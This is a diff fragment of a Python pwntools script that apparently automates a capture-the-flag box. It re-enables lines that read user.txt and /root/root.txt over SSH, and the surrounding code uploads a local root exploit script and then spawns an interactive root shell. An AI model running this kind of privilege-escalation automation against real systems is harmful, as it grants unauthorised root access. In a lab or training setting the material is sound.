@@ -66,10 +66,10 @@ def sssh():
     
 # Grabs the user flag and prints it to the screen
     log.progress("Fetching user flag")
-#    s2.sendline('cat user.txt')
-#    userflag = s2.recvuntil(PROMPT).decode().replace(PROMPT,'')
-#    userflag = userflag.replace("cat user.txt", '').strip()
-#    log.success("User flag is: " + str(userflag))
+    s2.sendline('cat user.txt')
+    userflag = s2.recvuntil(PROMPT).decode().replace(PROMPT,'')
+    userflag = userflag.replace("cat user.txt", '').strip()
+    log.success("User flag is: " + str(userflag))
 
 # Uploads and cleans up local root exploit script
     log.progress(f"Uploading root script to {REMOTE_SCRIPT}")
@@ -92,10 +92,10 @@ def sssh():
 
 # Grab root flag and spawn interactive shell
     log.progress("Fetching root flag")
-#    s2.sendline('cat /root/root.txt')
-#    rootflag = s2.recvuntil(ROOT_PROMPT).decode().replace(ROOT_PROMPT,'')
-#    rootflag = rootflag.replace("cat /root/root.txt", '').strip()
-#    log.success("Root flag is: " + str(rootflag))
+    s2.sendline('cat /root/root.txt')
+    rootflag = s2.recvuntil(ROOT_PROMPT).decode().replace(ROOT_PROMPT,'')
+    rootflag = rootflag.replace("cat /root/root.txt", '').strip()
+    log.success("Root flag is: " + str(rootflag))
     log.progress("Spawning root shell")
     s2.interactive()
 
